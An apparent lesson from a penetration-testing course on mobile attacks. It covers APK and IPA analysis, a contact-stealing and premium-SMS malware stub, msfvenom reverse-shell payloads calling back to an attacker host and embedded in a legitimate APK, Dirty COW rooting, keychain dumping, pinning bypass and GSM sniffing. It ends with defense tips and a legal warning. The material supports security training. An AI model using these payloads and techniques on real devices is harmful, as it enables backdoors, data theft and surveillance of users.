# LESSON 8: Mobile Device Attacks

## Objective
Master mobile security testing for Android and iOS platforms. Learn APK analysis, mobile app exploitation, device rooting/jailbreaking, and mobile malware development.

## Prerequisites
- Lessons 1-7 completed
- Android device or emulator
- iOS device (optional)
- Understanding of mobile app architecture

## Phase 1: Android Security Testing

### Step 1: Android Environment Setup
```bash
# Install Android SDK and tools
# Download Android Studio and SDK

# ADB setup
adb devices
adb shell

# Install useful APKs
adb install app.apk
adb uninstall com.package.name
```

### Step 2: APK Analysis
```bash
# Download APK from device
adb pull /data/app/com.package.name/base.apk

# APK information
aapt dump badging app.apk
aapt dump permissions app.apk

# Decompile APK
apktool d app.apk
jadx -d output_dir app.apk

# Static analysis
grep -r "password" decompiled_app/
grep -r "http://" decompiled_app/
grep -r "api_key" decompiled_app/
```

### Step 3: Dynamic Analysis
```bash
# Runtime analysis with Frida
frida -U -l script.js com.package.name

# Network traffic monitoring
mitmproxy -s android_cert.py
# Configure device proxy to 192.168.1.100:8080

# Logcat monitoring
adb logcat | grep "package_name"
adb logcat *:E  # Only errors
```

### Step 4: Android Exploitation Techniques
```bash
# Intent fuzzing
am start -n com.package.name/.MainActivity -e "param" "../../etc/passwd"

# Broadcast intent injection
am broadcast -a android.intent.action.BOOT_COMPLETED

# Content provider exploitation
content query --uri content://com.package.provider/data

# Insecure data storage
adb shell
find /data/data/com.package.name -name "*.db"
sqlite3 database.db
```

## Phase 2: iOS Security Testing

### Step 5: iOS Environment Setup
```bash
# Install iOS App Installer
ideviceinstaller -l  # List installed apps
ideviceinstaller -i app.ipa  # Install IPA

# File system access (jailbroken devices)
ssh root@ios_device_ip
find /var/mobile/Containers -name "*.app"
```

### Step 6: iOS Application Analysis
```bash
# IPA extraction and analysis
unzip app.ipa
otool -L Payload/App.app/App  # Check linked libraries
class-dump -H Payload/App.app/App -o headers/

# Plist analysis
plutil -convert xml1 Info.plist
grep -A 5 -B 5 "NSAppTransportSecurity" Info.plist
```

### Step 7: iOS Dynamic Analysis
```bash
# Frida on iOS (jailbroken)
frida -U -l ios_script.js AppName

# LLDB debugging
debugserver *:1234 -a AppName
lldb
process connect connect://device_ip:1234

# Keychain analysis
keychain_dumper

# SSL pinning bypass
objection -g AppName explore
ios sslpinning disable
```

## Phase 3: Mobile Malware Development

### Step 8: Android Malware Development
```java
// Malicious Service Example (Educational)
public class MaliciousService extends Service {
    @Override
    public void onCreate() {
        super.onCreate();
        // Steal contacts
        stealContacts();
        // Send SMS
        sendSMS("premium_number", "subscribe");
    }
    
    private void stealContacts() {
        ContentResolver cr = getContentResolver();
        Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
        // Extract and exfiltrate contact data
    }
}
```

### Step 9: Payload Embedding
```bash
# MSFVenom Android payloads
msfvenom -p android/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -o malicious.apk

# Embed in legitimate APK
msfvenom -x legitimate.apk -p android/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -o backdoored.apk

# Sign APK
keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore app.apk alias_name
```

## Phase 4: Device Exploitation

### Step 10: Android Rooting
```bash
# ADB exploit (older devices)
adb shell
su  # Check if already rooted

# Exploiting known vulnerabilities
# CVE-2016-5195 (Dirty COW)
gcc -o dirtycow dirtycow.c
adb push dirtycow /data/local/tmp/
adb shell chmod 755 /data/local/tmp/dirtycow
adb shell /data/local/tmp/dirtycow

# Using rooting tools
# SuperSU, Magisk, KingRoot (device dependent)
```

### Step 11: iOS Jailbreaking
```bash
# Checkm8 exploit (A5-A11 devices)
# Download checkm8 exploit tools
# Connect device in DFU mode
# Run exploit

# Install Cydia
# SSH access
ssh root@ios_device_ip  # Default password: alpine

# Install jailbreak detection bypass
# TweakRestrictor, Shadow, A-Bypass
```

## Phase 5: Mobile Network Attacks

### Step 12: Mobile Network Interception
```bash
# IMSI catcher simulation
# OpenBTS setup for educational purposes
# Requires SDR hardware

# GSM sniffing
kalibrate-rtl -s GSM900
grgsm_livemon -f 945e6

# 2G/3G/4G analysis
# Requires specialized hardware and legal authorization
```

### Step 13: Mobile App Network Attacks
```bash
# Certificate pinning bypass
objection -g com.package.name explore
android sslpinning disable

# Man-in-the-middle setup
# Install CA certificate on device
adb push mitmproxy-ca-cert.cer /sdcard/
# Settings > Security > Install certificates

# API endpoint discovery
frida -U -l api_tracer.js com.package.name
```

## Phase 6: Mobile Forensics

### Step 14: Android Forensics
```bash
# Data extraction (rooted device)
adb shell
dd if=/dev/block/mmcblk0 of=/sdcard/full_dump.img

# Application data extraction
adb backup -shared -all -system
# Convert backup to tar
java -jar abe.jar unpack backup.ab backup.tar

# SQLite database analysis
sqlite3 app_database.db
.tables
.schema table_name
SELECT * FROM sensitive_table;
```

### Step 15: iOS Forensics
```bash
# iTunes backup analysis (encrypted backups contain keychain)
# Use tools like 3uTools, iPhone Backup Extractor

# Physical extraction (jailbroken)
ssh root@ios_device_ip
dd if=/dev/disk0 of=/tmp/full_dump.img

# Keychain dump (jailbroken)
keychain_dumper > keychain_dump.txt

# Application sandbox analysis
find /var/mobile/Containers/Data/Application -name "*.sqlite"
```

## Custom Scripts Usage

### apk_analyzer.py
```bash
# Comprehensive APK security analysis
python3 scripts/lesson_08_mobile_attacks/apk_analyzer.py --apk app.apk --detailed
```

### mobile_payload_generator.py
```bash
# Generate mobile payloads and backdoors
python3 scripts/lesson_08_mobile_attacks/mobile_payload_generator.py --platform android --payload reverse_shell --lhost 192.168.1.100
```

## Evidence Collection

### Step 16: Document Mobile Attacks
```bash
# APK analysis report
aapt dump badging app.apk > apk_analysis.txt
androguard analyze app.apk > security_analysis.txt

# Runtime behavior logging
frida -U -l logging_script.js com.package.name > runtime_log.txt

# Network traffic capture
mitmdump -s capture_script.py -w mobile_traffic.dump
```

## Success Criteria

✓ APK successfully decompiled and analyzed
✓ iOS application security assessed
✓ Mobile malware developed and deployed
✓ Device rooting/jailbreaking achieved
✓ Mobile network traffic intercepted
✓ Application data extracted
✓ Certificate pinning bypassed
✓ Custom scripts functioning

## Mobile Security Tools Reference

| Tool | Platform | Purpose |
|------|----------|---------|
| APKtool | Android | APK decompilation |
| JADX | Android | Java decompilation |
| Frida | Both | Dynamic analysis |
| Objection | Both | Runtime manipulation |
| MobSF | Both | Static/Dynamic analysis |
| class-dump | iOS | Objective-C headers |
| otool | iOS | Binary analysis |
| Cydia Substrate | iOS | Runtime hooking |

## Common Vulnerabilities

### Android
- **Insecure Data Storage**: SQLite, SharedPreferences, logs
- **Weak Cryptography**: Hard-coded keys, weak algorithms
- **Insecure Communication**: HTTP, weak TLS, certificate issues
- **Authentication Issues**: Weak session management
- **Code Quality**: Buffer overflows, injection attacks

### iOS
- **Keychain Misuse**: Improper keychain storage
- **URL Scheme Abuse**: Unvalidated URL handlers
- **Binary Protection**: Lack of anti-debugging/tampering
- **Jailbreak Detection**: Insufficient root detection
- **SSL Pinning**: Missing or bypassable pinning

## Defense Recommendations

### For Developers
- Implement certificate pinning properly
- Use secure storage mechanisms
- Enable binary protection (obfuscation, anti-debugging)
- Implement proper session management
- Regular security testing

### For Organizations
- Mobile Device Management (MDM)
- Application wrapping solutions
- Network monitoring for mobile traffic
- Employee security awareness training
- Regular penetration testing

## Legal and Ethical Considerations

⚠️ **WARNING**: Mobile device attacks must only be performed on devices you own or have explicit permission to test. Unauthorized access to mobile devices is illegal.

## Next Lesson Preview
**Lesson 9**: Active Directory & Windows Attacks
- Domain enumeration techniques
- Kerberos attacks
- Lateral movement in Windows environments